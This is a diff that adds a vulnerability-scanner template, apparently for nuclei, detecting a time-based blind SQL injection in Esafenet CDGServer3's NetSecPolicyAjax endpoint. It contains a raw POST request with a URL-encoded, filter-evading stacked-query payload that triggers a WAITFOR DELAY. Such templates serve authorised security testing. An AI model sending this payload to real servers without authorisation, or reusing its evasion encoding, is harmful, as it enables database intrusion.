@@ -1,0 +1,23 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration > 4 && status_code==200 && contains_all(body,'OK')
+          type: dsl
+      raw:
+        - |
+          POST /CDGServer3/NetSecPolicyAjax;Servicelogin HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+          Accept-Language: zh-CN
+          Content-Type: application/x-www-form-urlencoded
+          Connection: close
+
+          command=upPriority&id=1%27%3b%00%1e%0a%57%41%49%54%66%4f%52%1e%44%45%6c%41%59%1e%27%30%3a%30%3a%34%27%1e%2d%2d
+id: SQL
+info:
+    author: sm
+    name: 亿赛通NetSecPolicyAjax-SQL注入
+    severity: high
+    tags:
+        - 亿赛通
